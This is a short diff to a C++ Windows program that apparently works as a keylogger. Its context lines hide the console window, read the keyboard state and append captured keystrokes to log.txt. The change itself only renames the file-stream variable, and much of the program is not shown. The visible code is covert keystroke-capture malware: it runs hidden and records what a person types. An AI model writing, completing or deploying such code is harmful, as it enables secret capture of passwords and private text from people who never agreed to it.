@@ -5,7 +5,7 @@
 
 int main() {
     ShowWindow(GetConsoleWindow(), SW_HIDE);
-    std::ofstream log;
+    std::ofstream f;
     BYTE state[256];
     GetKeyboardState(state);
     BYTE tmpState[256];
@@ -106,9 +106,9 @@ int main() {
                         continue;
                     }
                 }
-                log.open("log.txt", std::ofstream::app);
-                log << tmp << "\n";
-                log.close();
+                f.open("log.txt", std::ofstream::app);
+                f << tmp << "\n";
+                f.close();
             }
         }
     }
